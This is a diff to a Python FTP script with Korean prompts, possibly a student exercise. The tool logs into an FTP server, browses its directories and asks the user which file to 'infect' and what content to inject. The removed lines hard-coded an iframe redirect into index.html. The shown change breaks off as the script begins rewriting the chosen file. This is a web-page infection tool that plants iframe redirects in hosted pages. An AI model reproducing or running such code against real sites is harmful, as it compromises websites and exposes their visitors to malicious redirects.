@@ -190,15 +190,24 @@ class FTP():
         passWord = getpass.getpass("Input passWord : ")              
         ftp = ftplib.FTP(host)
         ftp.login(userName, passWord)
+        print("이동할 곳을 눌러주세요 설정이 끝나면 exit 를 눌러주세요")
+        print("ex) /home/s120180366/public_html/\n")        
         pwd=ftp.pwd()
-        print(pwd)
-        chdir = ftp.cwd("/home/"+userName+"/public_html") 
-        #chdir = ftp.cwd("/var/www/html") 
-        print(chdir)
         nlst = ftp.nlst()
-        print(nlst)
-        redirect = '<iframe src = "http://is.woosuk.ac.kr"></iframe>'
-        page='index.html'
+        print("현재위치 >> ",pwd,"\n에 들어있는 파일 및 디렉터리들은 \n", nlst)
+        while True:
+            a=input(">>")
+            if a=="exit":
+                break
+            else:
+                chdir = ftp.cwd(a)
+            pwd=ftp.pwd()
+            nlst = ftp.nlst()
+            print("\n현재위치 >> ",pwd," 에 들어있는 파일 및 디렉터리들은 \n", nlst)
+        print("\n")    
+        page = input("감염시키고 싶은 파일을 선택해주세요 >> ")
+        redirect = input("감염시키고 싶은 내용을 입력해주세요 >> ")
+        
         
         
         f = open(page + '.tmp', 'w')
